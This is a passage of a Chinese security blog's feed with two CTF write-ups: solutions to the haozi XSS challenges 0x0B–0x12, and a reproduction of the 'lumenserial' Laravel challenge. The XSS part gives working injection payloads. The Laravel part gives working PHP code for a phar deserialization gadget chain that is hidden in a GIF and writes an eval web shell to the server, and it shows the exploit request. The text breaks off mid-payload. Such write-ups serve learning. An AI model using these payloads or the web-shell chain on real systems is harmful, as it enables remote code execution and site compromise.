src="/2019/01/27/haozi-xss-challenges/2.png"><img src="/2019/01/27/haozi-xss-challenges/3.png"><p>最后在火狐测试成功，chrome的安全性真是高。</p><h2 id="0x0B"><a href="#0x0B" class="headerlink" title="0x0B"></a>0x0B</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.toUpperCase()</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;h1&gt;<span class="subst">$&#123;input&#125;</span>&lt;/h1&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题是把输入全部转成大写字母，这样的话<code>alert</code>就没有办法执行。但是我们有编码啊，并且大小写对标签和属性事件是一样的，所以只要把<code>alert(1)</code>的部分换成js编码就ok了。</p><p><code>&lt;img src=1 onerror=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&amp;#10;&gt;</code></p><h2 id="0x0C"><a href="#0x0C" class="headerlink" title="0x0C"></a>0x0C</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/script/ig</span>, <span class="string">''</span>)</span><br><span class="line">  input = input.toUpperCase()</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;h1&gt;'</span> + input + <span class="string">'&lt;/h1&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>emmm，这个题目有点水啊……就是多过滤了一个script，那不用script就好了，方法多的用不过来而且上一次payload同样有效。<code>&lt;img src=1 onerror=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&amp;#10;&gt;</code></p><h2 id="0x0D"><a href="#0x0D" class="headerlink" title="0x0D"></a>0x0D</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/[&lt;/"']/g</span>, <span class="string">''</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;script&gt;</span></span><br><span class="line"><span class="string">          // alert('<span class="subst">$&#123;input&#125;</span>')</span></span><br><span class="line"><span class="string">    &lt;/script&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这种输入点出现在js的单行注释区域，可以用换行绕过单行注释。剩下的一步思考了很多，由于过滤了<code>&lt;/&quot;&#39;</code>，不能闭合末尾的<code>&#39;)</code>，也不能用普通的注释<code>//</code>，<code>/*</code>，<code>&lt;!--</code>。看了看writeup，结果是用<code>--&gt;</code>，我有点傻眼了，什么鬼……</p><p>测试了一会儿，得出结论：<code>--&gt;</code>有和<code>//</code>一样的效果，同样是单行注释。这个真的是涨姿势了，以前只知道用上面的三种，结果现在又来一种。</p><p>payload：<code>换行alert(1)换行--&gt;</code></p><h2 id="0x0E"><a href="#0x0E" class="headerlink" title="0x0E"></a>0x0E</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/&lt;([a-zA-Z])/g</span>, <span class="string">'&lt;_$1'</span>)</span><br><span class="line">  input = input.toUpperCase()</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;h1&gt;'</span> + input + <span class="string">'&lt;/h1&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样想了老久，看了其他人的思路恍然大悟……这里由于把所有的标签前面都加了下划线，基本上正常使用的标签都GG。然而这里要用到之前的一个知识点，那就是出现在这种有大小写转换的地方，有些特殊字符在转换的时候也会变成正常的英文大写字母。参考：<a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html" target="_blank" rel="noopener">https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html</a></p><p>能利用的是i和s，这里用特殊字符绕过正则，然后通过大写函数转换成正常字母达到目的。<code>&lt;ımg src=1 onerror=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&amp;#10;&gt;</code>或者<code>&lt;ſcript src=https://xss.haozi.me/j.js&gt;&lt;/script&gt;</code></p><h2 id="0x0F"><a href="#0x0F" class="headerlink" title="0x0F"></a>0x0F</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">escapeHtml</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> s.replace(<span class="regexp">/&amp;/g</span>, <span class="string">'&amp;amp;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/'/g</span>, <span class="string">'&amp;#39;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/"/g</span>, <span class="string">'&amp;quot;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&lt;/g</span>, <span class="string">'&amp;lt;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&gt;/g</span>, <span class="string">'&amp;gt;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\//g</span>, <span class="string">'&amp;#x2f;'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;img src onerror="console.error('<span class="subst">$&#123;escapeHtml(input)&#125;</span>')"&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的编码除了实体编码是强行变成字符串，其他的<code>&amp;#</code>类编码都是可以用的，典型的纸老虎过滤。所以这里从单引号逃逸出来，插入alert，过滤后面的无用部分。</p><p><code>&#39;);alert(1);//</code></p><h2 id="0x10"><a href="#0x10" class="headerlink" title="0x10"></a>0x10</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">  window.data = <span class="subst">$&#123;input&#125;</span></span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题有点莫名其妙。。。随手输入了一个<code>alert(1)</code>就成功了。。。都不知道发生了什么。</p><p>看了其他人的答案都是闭合语句，然后插入的<code>alert(1)</code>。<code>1;alert(1);</code></p><p>查了一下window的属性列表，没有data属性，所以这里直接输入<code>alert(1)</code>就会触发弹窗。</p><h2 id="0x11"><a href="#0x11" class="headerlink" title="0x11"></a>0x11</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// from alf.nu</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">escapeJs</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">String</span>(s)</span><br><span class="line">            .replace(<span class="regexp">/\\/g</span>, <span class="string">'\\\\'</span>)</span><br><span class="line">            .replace(<span class="regexp">/'/g</span>, <span class="string">'\\\''</span>)</span><br><span class="line">            .replace(<span class="regexp">/"/g</span>, <span class="string">'\\"'</span>)</span><br><span class="line">            .replace(<span class="regexp">/`/g</span>, <span class="string">'\\`'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&lt;/g</span>, <span class="string">'\\74'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&gt;/g</span>, <span class="string">'\\76'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\//g</span>, <span class="string">'\\/'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\n/g</span>, <span class="string">'\\n'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\r/g</span>, <span class="string">'\\r'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\t/g</span>, <span class="string">'\\t'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\f/g</span>, <span class="string">'\\f'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\v/g</span>, <span class="string">'\\v'</span>)</span><br><span class="line">            <span class="comment">// .replace(/\b/g, '\\b')</span></span><br><span class="line">            .replace(<span class="regexp">/\0/g</span>, <span class="string">'\\0'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  s = escapeJs(s)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">  var url = 'javascript:console.log("<span class="subst">$&#123;s&#125;</span>")'</span></span><br><span class="line"><span class="string">  var a = document.createElement('a')</span></span><br><span class="line"><span class="string">  a.href = url</span></span><br><span class="line"><span class="string">  document.body.appendChild(a)</span></span><br><span class="line"><span class="string">  a.click()</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>又是一个纸老虎过滤，在js的字符串中代入反斜线会被解释成转义符，但是由于原本整体就是字符串所以转义符转义过后还是字符串，等于没有意义，所以直接闭合前面的<code>console.log</code>插入js语句。</p><p><code>&#39;console.log(&quot;\&quot;)\/\/&#39;</code> 像这样的字符串实际上为<code>&#39;console.log(&quot;&quot;)//&#39;</code>。可以看到反斜线在字符串中没有任何作用。</p><p>最后payload：<code>&quot;);alert(&quot;1</code>或者<code>&quot;);alert(1)//</code></p><h2 id="0x12"><a href="#0x12" class="headerlink" title="0x12"></a>0x12</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// from alf.nu</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">  s = s.replace(<span class="regexp">/"/g</span>, <span class="string">'\\"'</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log("'</span> + s + <span class="string">'");&lt;/script&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>和上一题类似的题目，只是没有了多余的字符串中转，现在的反斜线就有效果了，然而没有过滤反斜线，所以这里可以用反斜线转义过滤用的那个反斜线，这样就造成字符串逃逸，随意插入语句即可。</p><p><code>\&quot;);alert(1)//</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00&quot;&gt;&lt;a href=&quot;#0x00&quot; class=&quot;headerlink&quot; title=&quot;0x00&quot;&gt;&lt;/a&gt;0x00&lt;/h2&gt;&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;
      
    
    </summary>
    
      <category term="技术" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="XSS" scheme="https://hurricane618.me/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>code-breaking lumenserial 复现</title>
    <link href="https://hurricane618.me/2019/01/24/code-breaking-lumenserial/"/>
    <id>https://hurricane618.me/2019/01/24/code-breaking-lumenserial/</id>
    <published>2019-01-24T00:54:06.000Z</published>
    <updated>2019-01-24T01:29:32.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>php的laravel框架的审计题目。这里记录一下复现过程。整体思路是venenof7师傅的。</p><p>先来看入口，不知道他们怎么就找到了这个请求……</p><p><code>/server/editor?action=Catchimage&amp;source[]=phar:///var/www/html/upload/image/</code></p><p>我在黑盒测试的时候只找到了action，完全没有source的影子，个人感觉是结合白盒测试出来的。这里对应的源代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">doCatchimage</span><span class="params">(Request $request)</span></span>&#123;</span><br><span class="line">$sources = $request-&gt;input(<span class="keyword">$this</span>-&gt;config[<span class="string">'catcherFieldName'</span>]);</span><br><span class="line">$rets = [];</span><br><span class="line"><span class="keyword">if</span> ($sources) &#123;</span><br><span class="line"><span class="keyword">foreach</span> ($sources <span class="keyword">as</span> $url) &#123;</span><br><span class="line">$rets[] = <span class="keyword">$this</span>-&gt;download($url);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> response()-&gt;json([</span><br><span class="line"><span class="string">'state'</span> =&gt; <span class="string">'SUCCESS'</span>,</span><br><span class="line"><span class="string">'list'</span> =&gt; $rets</span><br><span class="line">]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$maxSize = <span class="keyword">$this</span>-&gt;config[<span class="string">'catcherMaxSize'</span>];</span><br><span class="line">        $limitExtension = array_map(<span class="function"><span class="keyword">function</span> <span class="params">($ext)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> ltrim($ext, <span class="string">'.'</span>);</span><br><span class="line">        &#125;, <span class="keyword">$this</span>-&gt;config[<span class="string">'catcherAllowFiles'</span>]);</span><br><span class="line">        $allowTypes = array_map(<span class="function"><span class="keyword">function</span> <span class="params">($ext)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"image/&#123;$ext&#125;"</span>;</span><br><span class="line">        &#125;, $limitExtension);</span><br><span class="line"></span><br><span class="line">        $content = file_get_contents($url);  url为图片路径</span><br><span class="line">        $img = getimagesizefromstring($content);</span><br><span class="line">省略下面的不重要代码……</span><br></pre></td></tr></table></figure><p>这里可以看到使用了<code>file_get_contents</code>进行文件操作，同样是使用blackhat议题上的phar在文件操作时会执行反序列化操作。这里只需要寻找有<code>__destruct</code>和<code>__wakeup</code>的类。</p><p>这里全局搜索<code>__destruct</code>，可以找到一个<code>class PendingBroadcast</code>，其他的都不太能使用，要不是destruct里面没东西，就是destruct里面执行方法的对象不可控。而这个唯一一个执行方法的对象可控的，可以将执行方法的对象换成没有该方法的对象，这样就会调用<code>__call</code>方法。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;events-&gt;dispatch(<span class="keyword">$this</span>-&gt;event);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>搜索<code>__call</code>得到<code>Generator</code>这个类中有这个方法，并且其中的<code>__call</code>能调用<code>format</code>而这个又会调用<code>call_user_func_array</code>，这里就可以执行代码了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">format</span><span class="params">($formatter, $arguments = array<span class="params">()</span>)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> call_user_func_array(<span class="keyword">$this</span>-&gt;getFormatter($formatter), $arguments);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($method, $attributes)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;format($method, $attributes);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFormatter</span><span class="params">($formatter)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;formatters[$formatter])) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;formatters[$formatter];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;providers <span class="keyword">as</span> $provider) &#123;</span><br><span class="line"><span class="keyword">if</span> (method_exists($provider, $formatter)) &#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;formatters[$formatter] = <span class="keyword">array</span>($provider, $formatter);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;formatters[$formatter];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> \InvalidArgumentException(sprintf(<span class="string">'Unknown formatter "%s"'</span>, $formatter));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个一开始构造的是只能执行单个函数，通过在formatters中的数组存储函数名，最后被调用，只是现在还没办法代入参数。来看看venenof7师傅的payload。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span>&#123;</span><br><span class="line"><span class="title">class</span> <span class="title">PendingBroadcast</span>&#123;</span><br><span class="line"><span class="title">protected</span> $<span class="title">events</span>;</span><br><span class="line"><span class="keyword">protected</span> $event;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($events, $event)</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;event = $event;</span><br><span class="line"><span class="keyword">$this</span>-&gt;events = $events;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line"><span class="title">class</span> <span class="title">Generator</span>&#123;</span><br><span class="line"><span class="title">protected</span> $<span class="title">formatters</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($forma)</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;formatters = $forma;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">$<span class="title">obj_1</span> = <span class="title">array</span>("<span class="title">dispatch</span>"=&gt;"<span class="title">phpinfo</span>");</span><br><span class="line">$obj_2 = <span class="keyword">new</span> Faker\Generator($obj_1);</span><br><span class="line">$obj = <span class="keyword">new</span> Illuminate\Broadcasting\PendingBroadcast($obj_2, <span class="number">1</span>);</span><br><span class="line">$p = <span class="keyword">new</span> Phar(<span class="string">'./1.phar'</span>, <span class="number">0</span>);</span><br><span class="line">$p-&gt;startBuffering();</span><br><span class="line">$p-&gt;setStub(<span class="string">'GIF89a&lt;?php __HALT_COMPILER(); ?&gt;'</span>);</span><br><span class="line">$p-&gt;setMetadata($obj);</span><br><span class="line">$p-&gt;addFromString(<span class="string">'1.txt'</span>, <span class="string">'text'</span>);</span><br><span class="line">$p-&gt;stopBuffering();</span><br><span class="line">rename(<span class="string">'./1.phar'</span>, <span class="string">'1.gif'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里传入数组是因为<code>getFormatter</code>函数会取formatters数组中的对应方法名的值。</p><p>这里生成1.gif需要先把phar的只读改成可以写才行。具体操作把选项改成off，并且去除注释<code>phar.readonly = Off</code></p><p>然而，重命名无法成功执行……死活不行。。。手动修改ing，上传服务器，抓包拿到图片路径。</p><p>访问<code>http://51.158.73.123:8080/server/editor?action=catchimage&amp;source[]=phar:///var/www/html/upload/image/65628379e91fb1adb860f98cd9f49712/201901/23/bed4111d42fb35cfdcff.gif</code> 成功执行</p><img src="/2019/01/24/code-breaking-lumenserial/1.png"><p>我们知道了服务器的php版本是很新的7.2.12，还有一些相关的php信息。</p><p>为了解决参数问题，必须要引入其他的类，之前的<code>$this-&gt;event</code>只能引用一个参数。</p><p>还是venenof7师傅的方法，如果本身参数不能为数组的话，那就找其他实例的方法，然后在其他实例的方法中再次构造可以控制的执行函数并且参数也能控制。</p><p>这里找到的是<code>ReturnCallback</code>和<code>StaticInvocation</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ReturnCallback</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line">public function invoke(Invocation $invocation)&#123;</span><br><span class="line"><span class="keyword">return</span> \call_user_func_array(<span class="keyword">$this</span>-&gt;callback, $invocation-&gt;getParameters());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StaticInvocation</span> <span class="keyword">implements</span> <span class="title">Invocation</span>, <span class="title">SelfDescribing</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line">public function getParameters(): array&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;parameters;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样我们就有可控的函数和可控的参数。</p><p>整个过程再走一遍，建议大家可以把整个过程用纸画一下，全用脑子有点难。首先，<code>$this-&gt;events</code>赋值成<code>Generator</code>实例这样就会调用<code>__call</code>执行第一个<code>call_user_func_array</code>。其次，在第一个函数执行中调用<code>invoke</code>方法，里面的callback设置成<code>file_put_contents</code>，之后invoke的参数为<code>StaticInvocation</code>的实例，实例中的有数组的参数当做invoke调用的第二个函数执行中的参数。最后就变成了任意代码执行。给一下payload。</p><h2 id="题目payload"><a href="#题目payload" class="headerlink" title="题目payload"></a>题目payload</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span>&#123;</span><br><span class="line"><span class="title">class</span> <span class="title">PendingBroadcast</span>&#123;</span><br><span class="line"><span class="title">protected</span> $<span class="title">events</span>;</span><br><span class="line"><span class="keyword">protected</span> $event;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($events, $event)</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;event = $event;</span><br><span class="line"><span class="keyword">$this</span>-&gt;events = $events;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line"><span class="title">class</span> <span class="title">Generator</span>&#123;</span><br><span class="line"><span class="title">protected</span> $<span class="title">formatters</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($forma)</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;formatters = $forma;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">PHPUnit</span>\<span class="title">Framework</span>\<span class="title">MockObject</span>\<span class="title">Invocation</span>&#123;</span><br><span class="line"><span class="title">class</span> <span class="title">StaticInvocation</span>&#123;</span><br><span class="line"><span class="title">private</span> $<span class="title">parameters</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($parameters)</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;parameters = $parameters;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">PHPUnit</span>\<span class="title">Framework</span>\<span class="title">MockObject</span>\<span class="title">Stub</span>&#123;</span><br><span class="line"><span class="title">class</span> <span class="title">ReturnCallback</span>&#123;</span><br><span class="line"><span class="title">private</span> $<span class="title">callback</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($callback)</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;callback = $callback;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">$obj_para = array('/var/www/html/upload/image/618.php', '&lt;?php @eval($_GET[618]);?&gt;');</span><br><span class="line">$obj_1 = <span class="keyword">new</span> PHPUnit\Framework\MockObject\Invocation\StaticInvocation($obj_para);</span><br><span class="line">$obj_2 = <span class="keyword">new</span> PHPUnit\Framework\MockObject\Stub\ReturnCallback(<span class="string">'file_put_contents'</span>);</span><br><span class="line">$obj_3 = <span class="keyword">array</span>(<span 